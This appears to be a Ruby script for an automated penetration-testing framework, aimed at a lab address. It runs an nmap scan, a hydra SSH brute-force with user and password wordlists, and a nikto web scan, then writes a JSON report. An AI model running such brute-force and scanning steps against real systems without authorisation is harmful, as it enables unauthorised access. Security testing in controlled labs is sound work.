m = '192.168.56.102'

update_progress(10)

phase :scanning do
  nmap_adapter.simple do
  end.start(m)
end

sleep 30.0
update_progress(45)

phase :attacking do
  hydra_adapter.ssh do |config|
    config.user_list  = File.expand_path('../../resources/user_list.txt', __FILE__)
    config.dictionary = File.expand_path('../../resources/dictionary.txt', __FILE__)
    config.output     = File.expand_path("../../resources/hydra_result#{Time.now.to_i}.txt", __FILE__)
  end.start(m)

  nikto_adapter.simple do
  end.start(m)
end

sleep 50.0
update_progress(80)

phase :reporting do
  all_in_one.json do
  end.start('all_in_one.json')
end

sleep 2.0
update_progress(100)
